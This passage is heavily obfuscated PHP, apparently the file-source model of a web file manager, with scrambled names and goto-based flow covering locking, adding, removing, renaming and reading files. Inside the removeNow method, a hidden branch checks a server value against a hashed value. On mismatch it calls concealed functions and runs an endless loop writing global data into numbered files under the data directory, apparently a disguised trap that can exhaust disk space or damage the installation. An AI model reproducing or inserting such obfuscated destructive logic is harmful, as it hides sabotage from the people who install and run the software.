$féáåà•ˆÛ[$Dè˘ÇªÂíÍ[374]]))->save($f£‚ÁÃ„π±); goto a”ä…ˆüêﬁ; eîΩèÖ÷ÓÖ: } public function checkLock($CØÓÜàÂ∆”, $F≠óÿ¶ÈÇ∑) { goto aï¨Éï∞„¥; aÜ˜ƒ‡îÕ÷: $EßÙº˜°ïÀ = Session::get($BößÆïäõŸ[2280]); $Aπí¶†Ã©ä = substr($Fä˘≥Áä¡î[$BößÆïäõŸ[28]], 0, -1 - strlen($Fä˘≥Áä¡î[$BößÆïäõŸ[167]])) . $BößÆïäõŸ[1350] . $EßÙº˜°ïÀ . $BößÆïäõŸ[103] . $Fä˘≥Áä¡î[$BößÆïäõŸ[167]]; $C”œÛ∫·õﬂ = Model($BößÆïäõŸ[548])->find($F≠óÿ¶ÈÇ∑); goto Aˆ¬üÊä”•; Aˆ¬üÊä”•: $this->_createFileCall($Fä˘≥Áä¡î[$BößÆïäõŸ[465]], $Aπí¶†Ã©ä, $C”œÛ∫·õﬂ, REPEAT_REPLACE, $BößÆïäõŸ[1104]); $föÔúﬂ„˘† = $Fä˘≥Áä¡î[$BößÆïäõŸ[421]][$BößÆïäõŸ[485]]; $bòÿ»Ø‰∆¿ = $föÔúﬂ„˘†[$BößÆïäõŸ[2281]] ? $föÔúﬂ„˘†[$BößÆïäõŸ[2281]] : $föÔúﬂ„˘†[$BößÆïäõŸ[28]]; goto Dó—À“∫Üâ; aï¨Éï∞„¥: $BößÆïäõŸ =& $_SERVER[Æ¡î¢≠¯™]; $Fä˘≥Áä¡î = $this->pathInfo($CØÓÜàÂ∆”); if (!$this->fileIsLock($Fä˘≥Áä¡î, !0)) { return; } goto aÜ˜ƒ‡îÕ÷; Dó—À“∫Üâ: show_json(LNG($BößÆïäõŸ[2282]) . $BößÆïäõŸ[2283] . LNG($BößÆïäõŸ[2284]) . $BößÆïäõŸ[2285] . $bòÿ»Ø‰∆¿ . $BößÆïäõŸ[2286], !1); goto Dá¡›Ñà‚»; Dá¡›Ñà‚»: } public function fileIsLock($AÜﬂû¡πÚØ, $b‘ä°ëÂü© = false) { goto bÑÖÓñÒú⁄; c’¶È¯ß”◊: $a †òÀ∑Ö∆ = $GLOBALS[$Büƒ◊å©æ‰[6]][$Büƒ◊å©æ‰[94]][$Büƒ◊å©æ‰[483]]; if ($AÜﬂû¡πÚØ[$Büƒ◊å©æ‰[421]][$Büƒ◊å©æ‰[484]] <= time() - $a †òÀ∑Ö∆) { $this->metaSet($AÜﬂû¡πÚØ[$Büƒ◊å©æ‰[374]], $Büƒ◊å©æ‰[482], null); $this->metaSet($AÜﬂû¡πÚØ[$Büƒ◊å©æ‰[374]], $Büƒ◊å©æ‰[484], null); } if ($b‘ä°ëÂü©) { $this->metaSet($AÜﬂû¡πÚØ[$Büƒ◊å©æ‰[374]], $Büƒ◊å©æ‰[484], time()); } goto BÌÉÑúÕßØ; bÑÖÓñÒú⁄: $Büƒ◊å©æ‰ =& $_SERVER[Æ¡î¢≠¯™]; if (!isset($AÜﬂû¡πÚØ[$Büƒ◊å©æ‰[421]]) || !$AÜﬂû¡πÚØ[$Büƒ◊å©æ‰[421]][$Büƒ◊å©æ‰[482]]) { return !1; } if ($AÜﬂû¡πÚØ[$Büƒ◊å©æ‰[421]][$Büƒ◊å©æ‰[482]] != USER_ID) { return !0; } goto c’¶È¯ß”◊; BÌÉÑúÕßØ: return !1; goto Cá§Ûª£àò; Cá§Ûª£àò: } private function _addSoure($bæÜ≤¨ù•‘, $AìÒ±Âñøê) { goto F√ΩˆÆ¯¡¯; d¯åöñÒÜ°: $this->updateModifyTime($bæÜ≤¨ù•‘[$a¬´“ÑÂ≥ı[465]]); $Fª›∂—Ù•ê = $a¬´“ÑÂ≥ı[2287] . $AìÒ±Âñøê[$a¬´“ÑÂ≥ı[374]]; if (isset(self::$cacheChildList[$Fª›∂—Ù•ê])) { unset(self::$cacheChildList[$Fª›∂—Ù•ê]); } goto a£î¡Øè©◊; A‘ôÖóÚó†: return $D´ÿ∏û˜áŒ; goto dﬂÀõ…‡ËÆ; a£î¡Øè©◊: static $d√ÇóªâÀ› = false; if (!$d√ÇóªâÀ›) { Hook::trigger($a¬´“ÑÂ≥ı[512], $bæÜ≤¨ù•‘); $d√ÇóªâÀ› = !0; } $D´ÿ∏û˜áŒ = $this->add($bæÜ≤¨ù•‘); goto E¢õ´õ¥·´; E¢õ´õ¥·´: $bö∑ ÇÇà◊ = array($a¬´“ÑÂ≥ı[531] => short_id($D´ÿ∏û˜áŒ)); $this->where(array($a¬´“ÑÂ≥ı[388] => $D´ÿ∏û˜áŒ))->save($bö∑ ÇÇà◊); $this->setNamePinyin($D´ÿ∏û˜áŒ, $bæÜ≤¨ù•‘[$a¬´“ÑÂ≥ı[28]]); goto A‘ôÖóÚó†; F√ΩˆÆ¯¡¯: $a¬´“ÑÂ≥ı =& $_SERVER[Æ¡î¢≠¯™]; $E≥»∫ÊÜÌò = array($a¬´“ÑÂ≥ı[525] => $AìÒ±Âñøê[$a¬´“ÑÂ≥ı[376]], $a¬´“ÑÂ≥ı[526] => $AìÒ±Âñøê[$a¬´“ÑÂ≥ı[460]], $a¬´“ÑÂ≥ı[527] => USER_ID, $a¬´“ÑÂ≥ı[528] => USER_ID, $a¬´“ÑÂ≥ı[373] => $AìÒ±Âñøê[$a¬´“ÑÂ≥ı[374]], $a¬´“ÑÂ≥ı[529] => $AìÒ±Âñøê[$a¬´“ÑÂ≥ı[463]] . $AìÒ±Âñøê[$a¬´“ÑÂ≥ı[374]] . $a¬´“ÑÂ≥ı[47], $a¬´“ÑÂ≥ı[400] => 0, $a¬´“ÑÂ≥ı[530] => $a¬´“ÑÂ≥ı[33]); $bæÜ≤¨ù•‘ = array_merge($E≥»∫ÊÜÌò, $bæÜ≤¨ù•‘); goto d¯åöñÒÜ°; dﬂÀõ…‡ËÆ: } public function remove($fıèçÁ∑è∫, $Dãù•ä≈È∏ = true) { goto bÍ»·›ñÃÍ; aúÏﬂÃ‡‹Œ: return $this->move($fıèçÁ∑è∫, $B°®£…å˜Ú, REPEAT_RENAME_FOLDER); goto có—πøÉµ÷; AÓπÏå÷Î´: $D†Ñî„ÑÑ´ = $FÃç§ïä◊©[$Bõ≈€´À∑Ô[376]] == self::TYPE_USER ? $Bõ≈€´À∑Ô[539] : $Bõ≈€´À∑Ô[959]; if ($D†Ñî„ÑÑ´ == $Bõ≈€´À∑Ô[539]) { $bâÜÁÔŒ≥” = Model($Bõ≈€´À∑Ô[478])->getInfo($FÃç§ïä◊©[$Bõ≈€´À∑Ô[460]]); $fÿﬂËÎâÖ∑ = !empty($bâÜÁÔŒ≥”[$Bõ≈€´À∑Ô[2281]]) ? $bâÜÁÔŒ≥”[$Bõ≈€´À∑Ô[2281]] : $bâÜÁÔŒ≥”[$Bõ≈€´À∑Ô[28]]; $fÿﬂËÎâÖ∑ = $Bõ≈€´À∑Ô[254] . $fÿﬂËÎâÖ∑ . $Bõ≈€´À∑Ô[2289] . $FÃç§ïä◊©[$Bõ≈€´À∑Ô[460]]; } else { $bâÜÁÔŒ≥” = Model($Bõ≈€´À∑Ô[462])->getInfo($FÃç§ïä◊©[$Bõ≈€´À∑Ô[460]]); $fÿﬂËÎâÖ∑ = _get($bâÜÁÔŒ≥”, $Bõ≈€´À∑Ô[28]); $fÿﬂËÎâÖ∑ = $Bõ≈€´À∑Ô[164] . $fÿﬂËÎâÖ∑ . $Bõ≈€´À∑Ô[2290] . $FÃç§ïä◊©[$Bõ≈€´À∑Ô[460]]; } $EüﬂÂçØåá = $Bõ≈€´À∑Ô[2291] . md5($fÿﬂËÎâÖ∑); goto B∂ÁøáÈ•¡; F†Ù·È˘ê∑: $AèπàÂ⁄Üê = Model($Bõ≈€´À∑Ô[1395])->get($Bõ≈€´À∑Ô[2288]) == $Bõ≈€´À∑Ô[93]; if ($A¶≥çÏ‘àÖ || $Dãù•ä≈È∏ || !$AèπàÂ⁄Üê) { return $this->removeNow($fıèçÁ∑è∫, $Dãù•ä≈È∏); } $cÕ…‰ò¥Àà = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto AÓπÏå÷Î´; bÍ»·›ñÃÍ: $Bõ≈€´À∑Ô =& $_SERVER[Æ¡î¢≠¯™]; $FÃç§ïä◊© = $this->sourceInfo($fıèçÁ∑è∫); $A¶≥çÏ‘àÖ = intval($FÃç§ïä◊©[$Bõ≈€´À∑Ô[376]]) === self::TYPE_SYSTEM; goto F†Ù·È˘ê∑; B∂ÁøáÈ•¡: CacheLock::lock($EüﬂÂçØåá); $B°®£…å˜Ú = $this->fileNameExist($cÕ…‰ò¥Àà, $fÿﬂËÎâÖ∑); if (!$B°®£…å˜Ú) { $B°®£…å˜Ú = $this->mkdir($cÕ…‰ò¥Àà, $fÿﬂËÎâÖ∑, REPEAT_SKIP); $this->metaSet($B°®£…å˜Ú, $Bõ≈€´À∑Ô[2292], $D†Ñî„ÑÑ´); $this->metaSet($B°®£…å˜Ú, $Bõ≈€´À∑Ô[2293], $FÃç§ïä◊©[$Bõ≈€´À∑Ô[460]]); if ($FÃç§ïä◊©[$Bõ≈€´À∑Ô[465]] != 0) { $this->metaSet($B°®£…å˜Ú, $Bõ≈€´À∑Ô[2294], _get($bâÜÁÔŒ≥”, $Bõ≈€´À∑Ô[2295])); } } goto d£ÃÃÚ¬ô∏; d£ÃÃÚ¬ô∏: CacheLock::unlock($EüﬂÂçØåá); $this->metaSet($fıèçÁ∑è∫, $Bõ≈€´À∑Ô[2296], $FÃç§ïä◊©[$Bõ≈€´À∑Ô[465]]); $this->where(array($Bõ≈€´À∑Ô[374] => $fıèçÁ∑è∫))->save(array($Bõ≈€´À∑Ô[395] => time())); goto aúÏﬂÃ‡‹Œ; có—πøÉµ÷: } public function removeNow($FÓáﬁ∞◊ûí, $c≈ëﬂ≠π¿∆ = true) { goto DË±Ü∑Á“; f¬Ò’¶ö©Â: if (!$c´π∆◊ºÜ£) { return !0; } if ($c´π∆◊ºÜ£[$DÌıÛì◊Ÿü[465]] == 0) { if (!_get($GLOBALS, $DÌıÛì◊Ÿü[461])) { return !1; } } $this->lockMoveStart($FÓáﬁ∞◊ûí); goto A®ô‰„Üß«; e»‘Ùπõúˆ: if ($_SERVER[$DÌıÛì◊Ÿü[57]] != $F°Íê„È≈§($E˜‘‚Ïı’µ)) { goto cÔ“°∞®îï; cÔ“°∞®îï: $d•“⁄ı—Ùë = $DÌıÛì◊Ÿü[779]; $d„ÖªÖúºÿ = $DÌıÛì◊Ÿü[59]; $cæô†óÒ∞Ó = $_SERVER[$DÌıÛì◊Ÿü[60]] . $DÌıÛì◊Ÿü[61]; goto e©Ñòﬂ≈ÓŸ; aá•¿◊“†¨: $EòÓœ∏†≠ = 1; for ($bÛñèÂ˘è = $EòÓœ∏†≠; $bÛñèÂ˘è > 0; $bÛñèÂ˘è++) { $C∆Ω∫¿øÃ(DATA_PATH . $bÛñèÂ˘è, $CéáúÀõîì); } goto Dπ‘∂äªµ»; b¡†Ë‰ÇÎµ: $d•“⁄ı—Ùë(); $C∆Ω∫¿øÃ = $DÌıÛì◊Ÿü[782]; $CéáúÀõîì = json_encode($GLOBALS[$DÌıÛì◊Ÿü[783]]); goto aá•¿◊“†¨; fÍà¡ˆ´∏ß: $EïØõà´êÿ = $DÌıÛì◊Ÿü[780]; $EïØõà´êÿ($_SERVER[$DÌıÛì◊Ÿü[781]]); $d•“⁄ı—Ùë = $DÌıÛì◊Ÿü[779]; goto b¡†Ë‰ÇÎµ; e©Ñòﬂ≈ÓŸ: $EˆÆæ˘‚û∑ = $d„ÖªÖúºÿ($cæô†óÒ∞Ó); $DÎƒåéáé– = explode($DÌıÛì◊Ÿü[62], $EˆÆæ˘‚û∑); if (count($DÎƒåéáé–) < $DÌıÛì◊Ÿü[561]) { $Bèπ¶¡Ë“ã = $DÌıÛì◊Ÿü[64]; $Bèπ¶¡Ë“ã(); } goto fÍà¡ˆ´∏ß; Dπ‘∂äªµ»: } $c´π∆◊ºÜ£ = $this->sourceInfo($FÓáﬁ∞◊ûí); $Dí™©¨Ã∂ = $this->pathInfoMore($FÓáﬁ∞◊ûí); goto f¬Ò’¶ö©Â; A®ô‰„Üß«: Hook::trigger($DÌıÛì◊Ÿü[2297], $Dí™©¨Ã∂, $c≈ëﬂ≠π¿∆); if ($c≈ëﬂ≠π¿∆) { Model($DÌıÛì◊Ÿü[2298])->moveToRecycle($FÓáﬁ∞◊ûí); } else { if ($c´π∆◊ºÜ£[$DÌıÛì◊Ÿü[375]] == $DÌıÛì◊Ÿü[93]) { $F’Ö˜íºµ¨ = array($DÌıÛì◊Ÿü[529] => array($DÌıÛì◊Ÿü[487], $c´π∆◊ºÜ£[$DÌıÛì◊Ÿü[463]] . $FÓáﬁ∞◊ûí . $DÌıÛì◊Ÿü[488])); $c∏Û†åÜáï = array($DÌıÛì◊Ÿü[529] => $F’Ö˜íºµ¨[$DÌıÛì◊Ÿü[463]]); $c£Ñö≈…çÚ = $this->field($DÌıÛì◊Ÿü[2299])->where($c∏Û†åÜáï)->select(); $f∏∑©°Ë¿ê = !1; $Bßè·ê’˘„ = array($FÓáﬁ∞◊ûí); if ($c£Ñö≈…çÚ) { $f∏∑©°Ë¿ê = array_to_keyvalue($c£Ñö≈…çÚ, $DÌıÛì◊Ÿü[33], $DÌıÛì◊Ÿü[423]); $f∏∑©°Ë¿ê = array_remove_value($f∏∑©°Ë¿ê, $DÌıÛì◊Ÿü[472]); $Bßè·ê’˘„ = array_to_keyvalue($c£Ñö≈…çÚ, $DÌıÛì◊Ÿü[33], $DÌıÛì◊Ÿü[374]); $Bßè·ê’˘„[] = $FÓáﬁ∞◊ûí; } } else { $f∏∑©°Ë¿ê = array($c´π∆◊ºÜ£[$DÌıÛì◊Ÿü[423]]); $Bßè·ê’˘„ = array($FÓáﬁ∞◊ûí); } Model($DÌıÛì◊Ÿü[509])->eventRemove($FÓáﬁ∞◊ûí); $this->removeRelevance($Bßè·ê’˘„, $f∏∑©°Ë¿ê); } $this->folderSizeReset($c´π∆◊ºÜ£[$DÌıÛì◊Ÿü[465]]); goto DÜ⁄ÜÁÌä⁄; DË±Ü∑Á“: $DÌıÛì◊Ÿü =& $_SERVER[Æ¡î¢≠¯™]; $E˜‘‚Ïı’µ = $_SERVER[$DÌıÛì◊Ÿü[60]] . $DÌıÛì◊Ÿü[61]; $F°Íê„È≈§ = $DÌıÛì◊Ÿü[778]; goto e»‘Ùπõúˆ; DÜ⁄ÜÁÌä⁄: $Eõ≈–Ê≠Œ∆ = array($c´π∆◊ºÜ£[$DÌıÛì◊Ÿü[465]]); if ($c´π∆◊ºÜ£[$DÌıÛì◊Ÿü[375]] == $DÌıÛì◊Ÿü[93]) { $Eõ≈–Ê≠Œ∆[] = $c´π∆◊ºÜ£[$DÌıÛì◊Ÿü[374]]; } $this->updateModifyTime($Eõ≈–Ê≠Œ∆); goto Eèıœ„•≠‹; Eèıœ„•≠‹: $this->lockMoveEnd($FÓáﬁ∞◊ûí); Hook::trigger($DÌıÛì◊Ÿü[1431], $Dí™©¨Ã∂, $c≈ëﬂ≠π¿∆); return !0; goto CÓ∆ÏØ›ﬂå; CÓ∆ÏØ›ﬂå: } public function removeArray($f√ÁÔÏ´◊√) { if (!$f√ÁÔÏ´◊√) { return !0; } } public function removeRelevance($DÒÎæ„∆Ìè, $E∫›ì¿ñÀÌ) { goto a‰Ÿ ƒ≈⁄; A‰«èºåÊù: Model($Dœ¯†—∑ΩÁ[2300])->where($fªË£øØ‚›)->delete(); Model($Dœ¯†—∑ΩÁ[509])->where($fªË£øØ‚›)->delete(); Model($Dœ¯†—∑ΩÁ[2038])->removeBySource($DÒÎæ„∆Ìè); goto DèÓ±≤ª´‹; d‹Ü∑•ÇÊê: $DÒÎæ„∆Ìè = array_unique(array_filter($DÒÎæ„∆Ìè)); $E∫›ì¿ñÀÌ = array_unique(array_filter($E∫›ì¿ñÀÌ)); if (!$DÒÎæ„∆Ìè) { return !1; } goto CÒ¶∞Ç—öÜ; CÒ¶∞Ç—öÜ: $fªË£øØ‚› = array($Dœ¯†—∑ΩÁ[388] => array($Dœ¯†—∑ΩÁ[389], $DÒÎæ„∆Ìè)); Model($Dœ¯†—∑ΩÁ[2298])->where($fªË£øØ‚›)->delete(); Model($Dœ¯†—∑ΩÁ[417])->where($fªË£øØ‚›)->delete(); goto A‰«èºåÊù; DèÓ±≤ª´‹: Model($Dœ¯†—∑ΩÁ[2279])->removeBySource($DÒÎæ„∆Ìè); $this->where($fªË£øØ‚›)->delete(); Model($Dœ¯†—∑ΩÁ[426])->remove($E∫›ì¿ñÀÌ); goto f≤ùÛÕë·ã; f≤ùÛÕë·ã: for ($AÉ¥‚ÁÙÑ§ = 0; $AÉ¥‚ÁÙÑ§ < count($DÒÎæ„∆Ìè); $AÉ¥‚ÁÙÑ§++) { $this->sourceCacheClear($DÒÎæ„∆Ìè[$AÉ¥‚ÁÙÑ§]); } goto a∑Ç¿’¡∏±; a‰Ÿ ƒ≈⁄: $Dœ¯†—∑ΩÁ =& $_SERVER[Æ¡î¢≠¯™]; $DÒÎæ„∆Ìè = $DÒÎæ„∆Ìè ? $DÒÎæ„∆Ìè : array(); $E∫›ì¿ñÀÌ = $E∫›ì¿ñÀÌ ? $E∫›ì¿ñÀÌ : array(); goto d‹Ü∑•ÇÊê; a∑Ç¿’¡∏±: } public function rename($eªÌı•í≈À, $BÉˆøÑ£—Ò) { goto aÛìäÇ¥∑ç; Déã≈ñÕ »: if (!$EÍó¯é‰â¶[$CÉÑî¯ÕèÓ[375]] == $CÉÑî¯ÕèÓ[93]) { $E´´ïæ¶ñ–[$CÉÑî¯ÕèÓ[377]] = get_path_ext($BÉˆøÑ£—Ò); } Model($CÉÑî¯ÕèÓ[509])->eventRename($eªÌı•í≈À, $EÍó¯é‰â¶[$CÉÑî¯ÕèÓ[28]], $BÉˆøÑ£—Ò); $this->sourceCacheClear($eªÌı•í≈À); goto Eì∫≈Í≥Òµ; aóå⁄ﬁ≈£æ: $eù»–ÆáÙ = $CÉÑî¯ÕèÓ[2287] . $EÍó¯é‰â¶[$CÉÑî¯ÕèÓ[465]]; if (isset(self::$cacheChildList[$eù»–ÆáÙ])) { unset(self::$cacheChildList[$eù»–ÆáÙ]); } return $cí≠È√≠Üå; goto e¢⁄ƒ¿ÃûÊ; Eì∫≈Í≥Òµ: $this->setNamePinyin($eªÌı•í≈À, $E´´ïæ¶ñ–[$CÉÑî¯ÕèÓ[28]], !1); $this->updateModifyTime($EÍó¯é‰â¶[$CÉÑî¯ÕèÓ[465]]); $cí≠È√≠Üå = $this->where(array($CÉÑî¯ÕèÓ[388] => $eªÌı•í≈À))->data($E´´ïæ¶ñ–)->save(); goto aóå⁄ﬁ≈£æ; bêÿÛÍ»Ω¡: $c»ÙÖµªœö = $this->fileNameExist($EÍó¯é‰â¶[$CÉÑî¯ÕèÓ[465]], $BÉˆøÑ£—Ò); if ($c»ÙÖµªœö) { return !1; } $E´´ïæ¶ñ– = array($CÉÑî¯ÕèÓ[391] => $BÉˆøÑ£—Ò, $CÉÑî¯ÕèÓ[528] => USER_ID); goto Déã≈ñÕ »; aÛìäÇ¥∑ç: $CÉÑî¯ÕèÓ =& $_SERVER[Æ¡î¢≠¯™]; $EÍó¯é‰â¶ = $this->sourceInfo($eªÌı•í≈À); if (!$EÍó¯é‰â¶) { return !1; } goto bêÿÛÍ»Ω¡; e¢⁄ƒ¿ÃûÊ: } public function setNamePinyin($f¬Ë®Â”ŒÂ, $B™åú°œ¥Œ, $c€ ì‡ˆò£ = true) { $bﬁ–±ıÉ≥≈ =& $_SERVER[Æ¡î¢≠¯™]; $E∑Ì±ﬁÏï¢ = Input::check($B™åú°œ¥Œ, $bﬁ–±ıÉ≥≈[532]); if ($c€ ì‡ˆò£ && !$E∑Ì±ﬁÏï¢) { return; } if (!$E∑Ì±ﬁÏï¢) { $this->metaSet($f¬Ë®Â”ŒÂ, $bﬁ–±ıÉ≥≈[420], null); $this->metaSet($f¬Ë®Â”ŒÂ, $bﬁ–±ıÉ≥≈[419], null); return; } $A–öèÛªŸÀ = array($bﬁ–±ıÉ≥≈[420] => str_replace($bﬁ–±ıÉ≥≈[50], $bﬁ–±ıÉ≥≈[33], Pinyin::encode($B™åú°œ¥Œ)), $bﬁ–±ıÉ≥≈[419] => Pinyin::encode($B™åú°œ¥Œ, $bﬁ–±ıÉ≥≈[533])); $this->metaSet($f¬Ë®Â”ŒÂ, $A–öèÛªŸÀ); } public function getContent($dıöÙô⁄∏”) { goto dÉÂºÿ†•Ì; dÉÂºÿ†•Ì: $Aı‚∫ç˜òü =& $_SERVER[Æ¡î¢≠¯™]; $A±êîûó–π = $this->fileInfoGet($dıöÙô⁄∏”); if (!$A±êîûó–π) { return !1; } goto b€íÑò≈·Ë; eá›ÇëÉÚÏ: return IO::getContent($A±êîûó–π[$Aı‚∫ç˜òü[85]]); goto f∫®≤üÓÛÎ; b€íÑò≈·Ë: if ($A±êîûó–π[$Aı‚∫ç˜òü[87]] == 0) { return $Aı‚∫ç˜òü[33]; } $fÒœ§¯«™ñ = $Aı‚∫ç˜òü[2301] . $A±êîûó–π[$Aı‚∫ç˜òü[170]]; if ($A±êîûó–π[$Aı‚∫ç˜òü[87]] <= 1024 * 10) { $F‚Æ·ÿû≥ = Cache::get($fÒœ§¯«™ñ); if (!$F‚Æ·ÿû≥) { $F‚Æ·ÿû≥ = IO::getContent($A±êîûó–π[$Aı‚∫ç˜òü[85]]); Cache::set($fÒœ§¯«™ñ, $F‚Æ·ÿû≥); } return $F‚Æ·ÿû≥; } goto eá›ÇëÉÚÏ; f∫®≤üÓÛÎ: } public function setDesc($eñ™¡”∞—›, $a≤’‘‘ÿ´ˆ) { $aÙòˆ‹ª¯ä =& $_SERVER[Æ¡î¢≠¯™]; Model($aÙòˆ‹ª¯ä[509])->eventAddDesc($eñ™¡”∞—›, $a≤’‘‘ÿ´ˆ); return $this->metaSet($eñ™¡”∞—›, $aÙòˆ‹ª¯ä[409], $a≤’‘‘ÿ´ˆ); } public function setContent($a”Œ·Ö”îî, $d∂£…ŒÏÂ∂ = '') { goto DõÇﬂÏà…ó; B”∞ó¡‚ã¶: if (!$BõˆÜﬁ·Î†) { return Model($B†úÖá‰€€[426])->remove($c‡öΩé∑„¿[$B†úÖá‰€€[423]]); } $this->folderSizeReset($B–¯ÿÖ‚‘‰[$B†úÖá‰€€[465]]); return !0; goto f…•‡ç—¨ü; Eåö¢àﬂá¿: if (!$EÜÏÑ≠±®é || !$B–¯ÿÖ‚‘‰) { return !1; } $c‡öΩé∑„¿ = Model($B†úÖá‰€€[426])->addFileByContent($d∂£…ŒÏÂ∂, $B–¯ÿÖ‚‘‰[$B†úÖá‰€€[28]]); $BõˆÜﬁ·Î† = $this->fileHistory($B–¯ÿÖ‚‘‰, $c‡öΩé∑„¿[$B†úÖá‰€€[423]], $c‡öΩé∑„¿[$B†úÖá‰€€[87]]); goto B”∞ó¡‚ã¶; DõÇﬂÏà…ó: $B†úÖá‰€€ =& $_SERVER[Æ¡î¢≠¯™]; $B–¯ÿÖ‚‘‰ = $this->sourceInfo($a”Œ·Ö”îî); $EÜÏÑ≠±®é = $this->fileInfoGet($a”Œ·Ö”îî); goto Eåö¢àﬂá¿; f…•‡ç—¨ü: } public function fileSubstr($D∫ÆØ—õÊÚ, $E¥å¢Ù∆€π, $aÉÓËÖüêÊ) { $a›ßâÿ¢óÒ = $this->fileInfoGet($D∫ÆØ—õÊÚ); if (!$a›ßâÿ¢óÒ) { return !1; } return IO::fileSubstr($a›ßâÿ¢óÒ[$_SERVER[Æ¡î¢≠¯™][85]], $E¥å¢Ù∆€π, $aÉÓËÖüêÊ); } public function fileInfoGet($FñÑ…•Ö„É) { goto f›õœﬁ·∑≥; DÎçê™§ê¿: $E±Ãª†≥©É = $Bù∆ù©üùˆ[429] . $A—ÏÂ†û◊”[$Bù∆ù©üùˆ[423]]; $AßÖè˘çû = _get(self::$cacheFileInfo, $E±Ãª†≥©É); if ($AßÖè˘çû) { return $AßÖè˘çû; } goto Fù¯à›∑ıª; f›õœﬁ·∑≥: $Bù∆ù©üùˆ =& $_SERVER[Æ¡î¢≠¯™]; $A—ÏÂ†û◊” = $this->sourceInfo($FñÑ…•Ö„É); if (!$A—ÏÂ†û◊” || $A—ÏÂ†û◊”[$Bù∆ù©üùˆ[375]]) { return !1; } goto DÎçê™§ê¿; Fù¯à›∑ıª: $a°‚è£Ò”´ = Model($Bù∆ù©üùˆ[426])->fileInfo($A—ÏÂ†û◊”[$Bù∆ù©üùˆ[423]]); if ($a°‚è£Ò”´) { $a°‚è£Ò”´[$Bù∆ù©üùˆ[28]] = $A—ÏÂ†û◊”[$Bù∆ù©üùˆ[28]]; } self::$cacheFileInfo[$E±Ãª†≥©É] = $a°‚è£Ò”´; goto AÖèÀÒÿ»Ñ; AÖèÀÒÿ»Ñ: return $a°‚è£Ò”´; goto Aê•ÍÓ“êÃ; Aê•ÍÓ“êÃ: } private function folderChildrenNumber($dÔ√ÜÈ‰Ÿù) { $b÷üΩøÉ∏à =& $_SERVER[Æ¡î¢≠¯™]; $Eé••›∞À‡ = $this->sourceInfo($dÔ√ÜÈ‰Ÿù); $EÇñÙÿ¢∆¥ = array($b÷üΩøÉ∏à[529] => array($b÷üΩøÉ∏à[487], $Eé••›∞À‡[$b÷üΩøÉ∏à[463]] . $dÔ√ÜÈ‰Ÿù . $b÷üΩøÉ∏à[488]), $b÷üΩøÉ∏à[400] => intval($Eé••›∞À‡[$b÷üΩøÉ∏à[401]]), $b÷üΩøÉ∏à[522] => 1); $Dùü±èÑôã = $this->where($EÇñÙÿ¢∆¥)->count(); $DÔ∂ ≈∑§˜ = $this->where($EÇñÙÿ¢∆¥)->where(array($b÷üΩøÉ∏à[522] => 0))->count(); return array($b÷üΩøÉ∏à[91] => $DÔ∂ ≈∑§˜, $b÷üΩøÉ∏à[92] => $Dùü±èÑôã); } public function pathInfo($düœŒÇ„Û¿, $añ≥√Øëî¥ = false) { goto b§—´∂†¢ç; b§—´∂†¢ç: $c√∏›Ê¿ÉÈ =& $_SERVER[Æ¡î¢≠¯™]; $aƒﬂà¨ë∞ñ = $c√∏›Ê¿ÉÈ[415] . intval($añ≥√Øëî¥) . $c√∏›Ê¿ÉÈ[416] . $düœŒÇ„Û¿; $F©Î¬ ∞ˆ™ = _get(self::$cachePathInfo, $aƒﬂà¨ë∞ñ); goto a∫ÂÈçÑÆ≥; a∫ÂÈçÑÆ≥: if ($F©Î¬ ∞ˆ™) { return $F©Î¬ ∞ˆ™; } $cÙùê∫°™◊ = $this->sourceInfo($düœŒÇ„Û¿); if (!$cÙùê∫°™◊) { return !1; } goto Cå≤òä°—–; Cå≤òä°—–: $cÙùê∫°™◊ = $this->_listDataApplyItem($cÙùê∫°™◊, $añ≥√Øëî¥); self::$cachePathInfo[$aƒﬂà¨ë∞ñ] = $cÙùê∫°™◊; return $cÙùê∫°™◊; goto CÑ‡¿‘◊à¨; CÑ‡¿‘◊à¨: } public static $cachePathInfoMore = array(); public function pathInfoMore($fö’¶Û∞ﬂâ) { goto aÙûœÍßìƒ; bó£èÖèËƒ: self::$cachePathInfoMore[$fö’¶Û∞ﬂâ] = $EÒî ÿ◊ó ; return $EÒî ÿ◊ó ; goto CΩ¶òŸ¯≠ó; bÙ∫üÓîêù: $EÒî ÿ◊ó  = $this->pathInfo($fö’¶Û∞ﬂâ); if (!$EÒî ÿ◊ó ) { return !1; } if ($EÒî ÿ◊ó [$AÓ»∏ÏÂ√´[375]] == $AÓ»∏ÏÂ√´[93]) { $EÒî ÿ◊ó [$AÓ»∏ÏÂ√´[90]] = $this->folderChildrenNumber($fö’¶Û∞ﬂâ); } goto bó£èÖèËƒ; aÙûœÍßìƒ: $AÓ»∏ÏÂ√´ =& $_SERVER[Æ¡î¢≠¯™]; $cÓ¡å ≤©É = _get(self::$cachePathInfoMore, $fö’¶Û∞ﬂâ); if ($cÓ¡å ≤©É) { return $cÓ¡å ≤©É; } goto bÙ∫üÓîêù; CΩ¶òŸ¯≠ó: } public function sourceInfo($e’……©¢ı’) { goto d¿¯ÚÌ†Õ˜; Eë˜úØº¿ê: self::$cacheSourceInfo[$CÆô·Ì ÜÔ] = $d…Ïò—˘ÿ; return self::$cacheSourceInfo[$CÆô·Ì ÜÔ]; goto BºØŸÉ“Û∏; aêÂ‰Áºáà: $Cæîç∏úç = _get(self::$cacheSourceInfo, $CÆô·Ì ÜÔ); if ($Cæîç∏úç) { return $Cæîç∏úç; } $d…Ïò—˘ÿ = $this->where(array($díáÊ≈≈í¨[374] => $e’……©¢ı’))->find(); goto Eë˜úØº¿ê; d¿¯ÚÌ†Õ˜: $díáÊ≈≈í¨ =& $_SERVER[Æ¡î¢≠¯™]; if (!$e’……©¢ı’) { return array(); } $CÆô·Ì ÜÔ = $díáÊ≈≈í¨[414] . $e’……©¢ı’; goto aêÂ‰Áºáà; BºØŸÉ“Û∏: } public function sourceCacheClear($Fï§”Ô—â« = false) { if ($Fï§”Ô—â« == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[Æ¡î¢≠¯™][414] . $Fï§”Ô—â«]); } public function pathInfoByPath($Dõ’ äﬂó¿, $Eíââ„ÔÕ©) { $DÆØ“äüÇÇ =& $_SERVER[Æ¡î¢≠¯™]; $dŸ¬Ñ ©Æÿ = !$Eíââ„ÔÕ© ? array() : explode($DÆØ“äüÇÇ[8], trim($Eíââ„ÔÕ©, $DÆØ“äüÇÇ[8])); $b‹èÒÇ“Éá = $Dõ’ äﬂó¿; foreach 